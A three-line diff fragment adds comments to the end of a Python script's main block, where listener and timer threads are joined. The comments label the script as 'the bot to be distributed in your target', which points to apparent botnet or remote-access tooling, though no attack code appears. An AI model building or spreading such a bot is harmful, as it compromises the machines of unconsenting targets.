@@ -120,3 +120,6 @@ if __name__ == "__main__":
     listener.join()
     time_elapsed.start()
     time_elapsed.join()
+    #-------------------------------------------------
+    #This is the bot to be distributed in your target.
+    #-------------------------------------------------
